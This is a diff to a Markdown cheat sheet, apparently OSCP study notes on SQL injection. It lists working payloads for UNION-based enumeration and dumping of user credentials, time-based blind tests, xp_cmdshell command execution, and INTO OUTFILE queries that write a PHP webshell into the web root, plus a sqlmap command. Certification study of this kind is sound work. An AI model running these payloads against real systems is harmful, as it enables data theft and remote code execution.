@@ -177,17 +177,23 @@ select * from offsec.dbo.users;
 ```shell
 # detect number of columns
 ' ORDER BY 1-- //
-' union select 1,2,3,4,5-- 
+' union select 1,2,3,4,5--
+
 # show data on the columns with the same datatype
 ' union select database(), user(), @@version, null, null -- //
+
 # show databases
 ' union select null, null, null, schema_name from information_schema.schemata-- -'
 # show tables
 ' union select null, null, null, table_name from information_schema.tables where table_schema=<table_schema>-- -'
 # show columns 
 ' union select null, null, null, column_name from information_schema.columns where table_name=<table_name>-- //
+
 # extract data
 ' union select null, null, null, group_concat(username, 0x3a, password), null from users -- //
+
+# abuse SELECT INTO_OUTFILE in MySQL
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 ```
 
 ### Blind (Time based)
@@ -198,6 +204,13 @@ select * from offsec.dbo.users;
 
 # postgresql sleep
 '; select pg_sleep(10);-- -'
+```
+
+#### Writing a webshell
+
+```shell
+...&limit=100;SELECT SLEEP(10)#...
+...&limit=100;SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"#...
 ```
 
 ### Manual Code Execution
@@ -212,12 +225,12 @@ SQL> EXECUTE xp_cmdshell 'whoami';
 # in newer versions
 SQL> enable_xp_cmdshell
 SQL> xp_cmdshell whoami
-
-# abuse SELECT INTO_OUTFILE in MySQL
-' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 ```
 
 ### Automated Code Execution
+
+!!! warning ""
+    Not allowed in OSCP exam
 
 ```shell
 sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
